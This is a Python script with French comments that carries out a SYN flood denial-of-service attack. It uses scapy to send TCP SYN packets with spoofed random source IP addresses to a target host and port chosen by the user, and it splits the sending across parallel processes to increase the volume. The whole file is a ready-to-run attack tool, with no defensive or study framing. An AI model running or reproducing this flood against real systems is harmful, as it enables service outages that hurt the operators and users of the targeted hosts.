from barre_de_progression import barre
from scapy.all import *
import multiprocessing
from demande_user import DemandeUtilisateur

class ENVOIS:

   
    def syn(cible, port, nbrpaquet, nbr_processus):
        # Boucle pour envoyer des paquets SYN
        packets_per_process = nbrpaquet // nbr_processus
        for _ in range(nbr_processus):
            # Création des processus pour envoyer les paquets SYN en parallèle
            p = multiprocessing.Process(target=ENVOIS.envois, args=(cible, port, packets_per_process))
            p.start()



        barre(nbrpaquet)
        
    def envois(cible, port, nbrpaquet):
        for _ in range(nbrpaquet):
            # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
            ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
            tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
            # Envoie paquet
            send(ip/tcpsyn, verbose=False)

if __name__ == "__main__":
    # Utilisation de la classe DemandeUtilisateur pour obtenir les informations de l'utilisateur
    demande_utilisateur = DemandeUtilisateur()
    cible, port, nbrpaquet, nbr_processus = demande_utilisateur.obtenir_informations()

    # Appel de la méthode syn de la classe ENVOIS avec les paramètres fournis par l'utilisateur
    ENVOIS.syn(cible, port, nbrpaquet, nbr_processus)
